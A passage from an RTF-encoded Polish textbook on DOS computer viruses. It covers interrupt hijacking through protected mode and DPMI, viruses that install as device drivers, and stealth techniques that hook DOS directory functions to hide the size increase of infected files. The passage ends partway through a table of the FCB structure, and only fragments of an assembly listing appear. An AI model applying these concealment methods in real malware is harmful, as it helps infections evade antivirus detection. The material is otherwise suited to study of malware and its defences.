\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     TraceMode db ?                      ; flaga ON=wlaczony/OFF= wlaczony tracer}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     MagicNum1 dw ?                      ; zmienne pomocnicze do przechowywania}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch     MagicNum2 dw ?                      ; wartosci potrzebnych do sprawdzenia czy}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; jestesmy juz we wlasciwym kodzie DOS/BIOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch PROG ends                               ; koniec segmentu kodu i danych}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch end CodeStart                           ; koniec programu, pierwsza instrukcja}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                                         ; pod etykieta CodeStart}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 6.5. Wykorzystanie trybu chronionego}{\f1\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Tryb chroniony nie jest zbyt cz\uc1\u281\'easto wykorzystywany przez wirusy, jednak kilka z nich u\uc1\u380\'bfywa go do przejmowania przerwa\uc1\u324\'f1. Po zainstalowaniu (co wi\uc1\u261\'b9\uc1\u380\'bfe si\uc1\u281\'ea z przej\uc1\u347\'9cciem do trybu chronionego) ka\uc1\u380\'bfde odwo\uc1\u322\'b3anie do jakiegokolwiek przerwania b\uc1\u281\'eadzie kierowane najpierw do wirusa, a dopiero ten przeka\uc1\u380\'bfe je do oszukiwanego systemu poprzez chwilowe przej\uc1\u347\'9ccie (ang. redirection) do trybu rzeczywistego (lub trybu V86). Ponadto, aby utrudni\uc1\u263\'e6 wykrycie wirusa w pami\uc1\u281\'eaci, mo\uc1\u380\'bfna po instalacji p}{\f1\fs24\lang1045{\*\listtag0}r}{\f0\fs24\lang1045{\*\listtag0}zenie\uc1\u347\'9c\uc1\u263\'e6 jego kod do pami\uc1\u281\'eaci powy\uc1\u380\'bfej 1MB.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch W przypadku systemu Windows do przejmowania przerwa\uc1\u324\'f1 mo\uc1\u380\'bfna wykorzysta\uc1\u263\'e6 fakt, i\uc1\u380\'bf udost\uc1\u281\'eapnia on programom us\uc1\u322\'b3ugi specyfikacji DPMI (ang. DOS Protected Mode Interface).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Do przejmowania przerwa\uc1\u324\'f1 s\uc1\u322\'b3u\uc1\u380\'bf\uc1\u261\'b9 funkcje:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > 0200h -}{\f0\fs24\lang1045{\*\listtag0} odczytanie wektora przerwa\uc1\u324\'f1 trybu rzeczywistego;}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > 0201h - zapisanie wektora przerwa\uc1\u324\'f1 trybu rzeczywistego;}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > 0202h - odczytanie adresu procedury obs\uc1\u322\'b3ugi wyj\uc1\u261\'b9tku;}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > 0203h - ustawienie adresu procedury obs\uc1\u322\'b3ugi wyj\uc1\u261\'b9tku;}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > 0204h - odczytanie wektora przerwa\uc1\u324\'f1 }{\f1\fs24\lang1045{\*\listtag0}trybu wirtualnego;}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > 0205h - zapisanie wektora przerwa\uc1\u324\'f1 trybu wirtualnego;}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Powy\uc1\u380\'bfsze funkcje s\uc1\u261\'b9 dost\uc1\u281\'eapne w trybie chronionym za po\uc1\u347\'9crednictwem przerwania 31h. Przed ich u\uc1\u380\'bfyciem nale\uc1\u380\'bfy sprawdzi\uc1\u263\'e6, czy DPMI jest dost\uc1\u281\'eapne, za pomoc\uc1\u261\'b9 funkcji (1687/2F). Dok\uc1\u322\'b3adniejsze informacje na temat specyfikacji DPMI oraz trybu chronionego zawarte s\uc1\u261\'b9 w pozycjach [l] i [6] ze spisu na ko\uc1\u324\'f1cu ksi\uc1\u261\'b9\uc1\u380\'bfki.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 6.6. W\uc1\u322\'b3\uc1\u261\'b9czanie si\uc1\u281\'ea jako program obs\uc1\u322\'b3ugi urz\uc1\u261\'b9dzenia}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Jednym z wirus\'f3w stosuj\uc1\u261\'b9cych t\uc1\u281\'ea metod\uc1\u281\'ea jest wymieniany ju\uc1\u380\'bf wirus DIR-2. Zamienia on oryginaln\uc1\u261\'b9 procedur\uc1\u281\'ea obs\uc1\u322\'b3ugi dysk\'f3w poprzez manipulacj\uc1\u281\'ea na strukturach DPB, co zosta\uc1\u322\'b3o dok\uc1\u322\'b3adniej om\'f3wione przy okazji omawiania wirus\'f3w zara\uc1\u380\'bfaj\uc1\u261\'b9cych JAP}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\qc\sl240\slmult1\itap0{\f0\fs28\lang1045{\*\listtag0}\abinodiroverride\ltrch ROZDZIA\uc1\u321\'a3 7}{\f0\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Ka\uc1\u380\'bfdemu tw\'f3rcy wirusa zale\uc1\u380\'bfy na tym, aby jego dzie\uc1\u322\'b3o jak najd\uc1\u322\'b3u\uc1\u380\'bfej pozostawa\uc1\u322\'b3o nie wykryte przez u\uc1\u380\'bfytkownika zainfekowanego systemu. Jest to zrozumia\uc1\u322\'b3e, gdy\uc1\u380\'bf wykrycie wirusa zwykle ko\uc1\u324\'f1czy si\uc1\u281\'ea tym, i\uc1\u380\'bf w nied\uc1\u322\'b3ugim czasie wpada on w r\uc1\u281\'eace os\'f3b pisz\uc1\u261\'b9cych programy antywirusowe, a to owocuje napisaniem szczepionki, za spraw\uc1\u261\'b9}{\f1\fs24\lang1045{\*\listtag0} kt\'f3rej wirus znika wkr\'f3tce z wirusowej sceny.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Niniejszy rozdzia\uc1\u322\'b3 opisuje kilka najcz\uc1\u281\'ea\uc1\u347\'9cciej stosowanych przez wirusy technik ukrywania si\uc1\u281\'ea w systemie operacyjnym. Niekt\'f3re z nich wymagaj\uc1\u261\'b9 sta\uc1\u322\'b3ej obecno\uc1\u347\'9cci wirusa w pami\uc1\u281\'eaci, inne sprowadzaj\uc1\u261\'b9 si\uc1\u281\'ea do wykonania kilku operacji, kt\'f3re niejako na sta\uc1\u322\'b3e ukrywaj\uc1\u261\'b9 wirusa przed oczyma ciekawskich.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 7.1. Technika stealth}{\f1\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Wirusy komputerowe modyfikuj\uc1\u261\'b9 pliki i sektory, zmieniaj\uc1\u261\'b9c ich zawarto\uc1\u347\'9c\uc1\u263\'e6 (w przypadku plik\'f3w zwykle powi\uc1\u281\'eakszaj\uc1\u261\'b9 jeszcze ich d\uc1\u322\'b3ugo\uc1\u347\'9c\uc1\u263\'e6). Teoretycznie wi\uc1\u281\'eac, aby wykry\uc1\u263\'e6 wirusa, wystarczy odczyta\uc1\u263\'e6 plik lub sektor i odnale\uc1\u378\'9f\uc1\u263\'e6 w nim, przy u\uc1\u380\'bfyciu skaningu, odpowiedni\uc1\u261\'b9 sekwencj\uc1\u281\'ea (sygnatur\uc1\u281\'ea) wirusa. I rzeczywi\uc1\u347\'9ccie, metoda ta stosowana by\uc1\u322\'b3a z du\uc1\u380\'bfym powodzeniem a\uc1\u380\'bf do momentu, gdy pojawi\uc1\u322\'b3 si\uc1\u281\'ea pierwszy wirus u\uc1\u380\'bfywaj\uc1\u261\'b9cy t}{\f1\fs24\lang1045{\*\listtag0}e}{\f0\fs24\lang1045{\*\listtag0}chniki stealth. S\uc1\u322\'b3owo stealth znaczy po angielsku niewidzialny. Takimi w\uc1\u322\'b3a\uc1\u347\'9cnie wydaj\uc1\u261\'b9 si\uc1\u281\'ea wirusy u\uc1\u380\'bfywaj\uc1\u261\'b9ce tej ciekawej sztuczki, kt\'f3ra polega na kontroli odpowiednich funkcji systemu DOS lub BIOS, obs\uc1\u322\'b3uguj\uc1\u261\'b9cych pami\uc1\u281\'ea\uc1\u263\'e6 i operacje dyskowe.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch W momencie pr\'f3by }{\f0\fs24\lang1045{\*\listtag0}dowolnego dost\uc1\u281\'eapu do zainfekowanego pliku lub sektora uruchamiane s\uc1\u261\'b9 mechanizmy wirusa, kt\'f3re maj\uc1\u261\'b9 na celu oszukanie u\uc1\u380\'bfytkownika.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Oszustwo polega na tym, i\uc1\u380\'bf fizycznie zara\uc1\u380\'bfony obiekt, po odpowiedniej obr\'f3bce przez wirusa, wygl\uc1\u261\'b9da, jakby by\uc1\u322\'b3 nie zainfekowany. R\'f3\uc1\u380\'bfne odmiany techniki stealth zosta\uc1\u322\'b3y om\'f3wione poni\uc1\u380\'bfej.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 7.1.1. Podawanie prawdziwych d\uc1\u322\'b3ugo\uc1\u347\'9cci plik\'f3w (ang. }{\f1\fs24\i\b\lang1045{\*\listtag0}semi-stealth}{\f1\fs24\b\lang1045{\*\listtag0})}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Wirusy wykorzystuj\uc1\u261\'b9ce t\uc1\u281\'ea technik\uc1\u281\'ea oszukuj\uc1\u261\'b9 system poprzez podawanie rzeczywistych d\uc1\u322\'b3ugo\uc1\u347\'9cci zainfekowanych plik\'f3w, wy\uc1\u347\'9cwietlanych po wykonaniu polecenia DIR lub te\uc1\u380\'bf w oknie program\'f3w dos Navi-gator, Norton Commander, XtreeGold, Windows Commander czy te\uc1\u380\'bf innych, mniej znanych nak\uc1\u322\'b3adek.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Wy\uc1\u380\'bfej wymienione programy u\uc1\u380\'bfywaj\uc1\u261\'b9 do przeszukiwania zawarto\uc1\u347\'9cci katalogu jednej z trzech par funkcji, z kt\'f3rych pierwsza poszukuje pierwszego, a druga kolejnego wyst\uc1\u261\'b9pienia w katalogu. Funkcje te to (1142/21), (4E/4F/21), (714E/714F/21). Oszukuj\uc1\u261\'b9cy system wirus przejmuje te funkcje (niekoniecznie 'wszystkie) i monitoruje odpowiednie pola struktur, na kt\'f3ry}{\f1\fs24\lang1045{\*\listtag0}ch operuje dana funkcja.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch W momencie wykonywania jednej z funkcji wirus wywo\uc1\u322\'b3uje pierwotny program obs\uc1\u322\'b3ugi przerwania, a nast\uc1\u281\'eapnie modyfikuje elementy odpowiedniej struktury:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > pozycji katalogu (funkcje 11/12);}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > DTA (funkcje 4E/4F);}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > FindData (funkcje 714E/714F).}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Modyfikacja polega na odj\uc1\u281\'eaciu d\uc1\u322\'b3ugo\uc1\u347\'9cci wirusa od d\uc1\u322\'b3ugo\uc1\u347\'9cci pliku opisywanej w odpowiednim polu struktury oraz najcz\uc1\u281\'ea\uc1\u347\'9cciej jakiej\uc1\u347\'9c modyfikacji czasu lub daty, b\uc1\u281\'ead\uc1\u261\'b9cych znacznikiem zainfekowania pliku. Powy\uc1\u380\'bfsze operacje wykonywane s\uc1\u261\'b9 oczywi\uc1\u347\'9ccie tylko po wykryciu obecno\uc1\u347\'9cci wirusa w znalezionym pliku.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 7.1.1.1. Polecenie DIR wywo\uc1\u322\'b3ywane z poziomu DOS}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Polecenie DIR u\uc1\u380\'bfywa do przegl\uc1\u261\'b9dania zawarto\uc1\u347\'9cci katalogu, pary dw\'f3ch przeznaczonych specjalnie do tego celu funkcji (11,12/21). Obie funkcje korzystaj\uc1\u261\'b9 z najs}{\f1\fs24\lang1045{\*\listtag0}tarszej metody operowania na plikach, a mianowicie z tzw. bloku opisu pliku FCB (ang. File Control Block\},}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch podawanego jako parametr wej\uc1\u347\'9cciowy do funkcji oraz z pola opisu pozycji katalogu, zwracanego po jej bezb\uc1\u322\'b3\uc1\u281\'eadnym wykonaniu w buforze DTA (ang. Disk Tra}{\f1\fs24\lang1045{\*\listtag0}nsfer Area), kt\'f3rych opis przedstawiono w kolejnych tabelach.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Podczas odwo\uc1\u322\'b3a\uc1\u324\'f1 do struktury FCB nale\uc1\u380\'bfy pami\uc1\u281\'eata\uc1\u263\'e6, i\uc1\u380\'bf istniej\uc1\u261\'b9 dwie wersje opisu bloku FCB: zwyk\uc1\u322\'b3y i rozszerzony, b\uc1\u281\'ead\uc1\u261\'b9cy rozwini\uc1\u281\'eaciem bloku zwyk\uc1\u322\'b3ego (zawiera dodatkowe pola). Je\uc1\u380\'bfeli pierwszy bajt}{\f1\fs24\lang1045{\*\listtag0} bloku jest r\'f3wny 0FFh, mamy do czynienia z rozszerzonym blokiem opisu pliku.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Adres aktualnego bufora DTA uzyskuje si\uc1\u281\'ea za pomoc\uc1\u261\'b9 funkcji (2F/21), kt\'f3ra umieszcza go w rejestrach ES:BX. Po powrocie z funkcji wskazuj\uc1\u261\'b9 one bezpo\uc1\u347\'9crednio na pole opisu pozycji katalogu, w kt\'f3rym ju\uc1\u380\'bf bez przeszk\'f3d mo\uc1\u380\'bfna odpowiednio modyfikowa\uc1\u263\'e6 pola d\uc1\u322\'b3ugo\uc1\u347\'9cci pliku (1C-1F) oraz czasu i daty ostatniej modyfikacji (18-19 i 1A-1B).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch Struktura bloku opisu pliku FCB (zwyk\uc1\u322\'b3ego)}{\*\abitableprops table-col-spacing:0.02in; table-column-leftpos:-0.0486in; table-column-props:0.7175in/5.8710in/; table-sdh:89923c8}\par{\*\abicellprops left-attach:0; right-attach:1; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}{
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}Adres}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:0; bot-attach:1; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}Zawarto\uc1\u347\'9c\uc1\u263\'e6}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}00}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:1; bot-attach:2; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}numer nap\uc1\u281\'eadu (0=domy\uc1\u347\'9clny, 1=A, B=2,...); je\uc1\u380\'bfeli =OFFh, to rozszerzony blok opisu pliku FCB}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}01-08}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:2; bot-attach:3; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}8 bajt\'f3w nazwy pliku}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}09-0B}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:3; bot-attach:4; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}3 bajty rozszerzenia pliku }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}0C-0D}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:4; bot-attach:5; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0} numer aktualnego bloku }\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}0E-0F}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:5; bot-attach:6; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}d\uc1\u322\'b3ugo\uc1\u347\'9c\uc1\u263\'e6 logicznego rekordu}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:6; bot-attach:7; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}10-13}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:6; bot-attach:7; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}d\uc1\u322\'b3ugo\uc1\u347\'9c\uc1\u263\'e6 pliku}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:7; bot-attach:8; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}14-15}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:7; bot-attach:8; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}data ostatniej modyfikacji pliku}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:8; bot-attach:9; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}16-17}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:8; bot-attach:9; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}czas ostatniej modyfikacji pliku}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:9; bot-attach:10; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}18}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:9; bot-attach:10; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f0\fs24\lang1045{\*\listtag0}ilo\uc1\u347\'9c\uc1\u263\'e6 SFT dla pliku}\cell{\*\abiendcell}{\*\abicellprops left-attach:0; right-attach:1; top-attach:10; bot-attach:11; bot-style:none; left-style:none; right-style:none; top-style:none}\row
\trowd \itap1\trgaph7\trql\trrh0\trleft-69\trbrdrt\brdrs\brdrw10 \trbrdrl\brdrs\brdrw10 \trbrdrb\brdrs\brdrw10 \trbrdrr\brdrs\brdrw10 \clvertalt\cltxlrtb    \cellx977\clvertalt\cltxlrtb    \cellx9431
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}19}\cell{\*\abiendcell}{\*\abicellprops left-attach:1; right-attach:2; top-attach:10; bot-attach:11; bot-style:none; left-style:none; right-style:none; top-style:none}
\pard\plain\ltrpar\ql\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}atrybuty, znaczenie bit\'f3w}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\intbl\itap1{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch bity 7-6 }{\f1\fs24\lang1045{\*\listtag0}\par}
